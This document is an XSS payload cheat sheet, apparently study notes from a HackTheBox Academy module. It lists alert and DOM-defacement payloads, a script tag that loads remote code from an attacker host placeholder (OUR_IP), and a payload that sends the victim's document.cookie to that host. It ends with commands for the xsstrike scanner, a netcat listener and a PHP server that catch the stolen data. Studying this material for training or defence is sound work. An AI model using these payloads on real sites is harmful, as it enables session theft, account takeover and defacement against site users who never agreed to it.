
### Basic Payloads

### Basic alert XSS

```html
<script>alert(window.origin)</script>
```

### Plaintext injection

```html
<plaintext>
```

### Basic print execution

```html
<script>print()</script>
```

### HTML-based alert XSS

```html
<img src="" onerror=alert(window.origin)>
```

### DOM Manipulation

### Change background color

```html
<script>document.body.style.background = "#141d2b"</script>
```

### Change background image

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

### Change website title

```html
<script>document.title = 'HackTheBox Academy'</script>
```

### Overwrite website's main body

```html
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
```

### Remove specific HTML element

```html
<script>document.getElementById('urlform').remove();</script>
```

### Advanced Payloads

### Load remote script

```html
<script src="http://OUR_IP/script.js"></script>
```

### Send cookie data to attacker

```html
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
```

---

## Common Commands

### Scanning and Exploitation

### Run xsstrike on a URL parameter

```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

### Networking

### Start netcat listener

```bash
sudo nc -lvnp 80
```

### Start PHP server

```bash
sudo php -S 0.0.0.0:80
```
